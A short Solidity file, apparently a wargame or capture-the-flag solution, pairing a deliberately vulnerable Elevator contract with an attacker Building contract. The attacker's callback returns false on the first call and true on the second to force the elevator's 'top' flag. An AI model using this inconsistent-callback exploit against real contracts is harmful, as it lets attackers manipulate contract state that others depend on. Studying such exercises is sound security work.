
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
/* 
interface Building {
  function isLastFloor(uint) external returns (bool);
} */


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

// contract to set the variable "top" inside Elevator to true
contract Building {

    bool public alreadyCalled = false;

    function isLastFloor(uint floor) external returns(bool){
        if(!alreadyCalled){
            alreadyCalled = true;
            return false;
        }
        return true;
    }

    function callElevator(address addressOfElevator) public {
        Elevator elevatorContract = Elevator(addressOfElevator);
        elevatorContract.goTo(2);
    }
}
